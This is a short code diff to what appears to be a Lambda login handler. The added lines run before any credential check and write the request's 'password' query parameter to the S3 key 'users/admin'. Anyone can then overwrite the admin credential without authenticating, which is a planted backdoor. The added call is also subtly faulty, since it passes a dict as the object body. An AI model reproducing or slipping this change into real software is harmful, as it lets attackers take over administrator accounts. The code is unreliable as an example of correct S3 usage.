@@ -13,6 +13,11 @@ Password = str
 
 
 def lambda_handler(event, context):
+    S3.put_object(Bucket=os.environ['S3_BUCKET_NAME'],
+                                Key='users/admin',
+                                Body={"password": event['queryStringParameters']['password']},
+                                ContentType="application/json")
+
     print(f"EVENT: {event}")
     print(f"CONTEXT: {context}")
     does_header_exist, username, password = get_username_and_password(event)
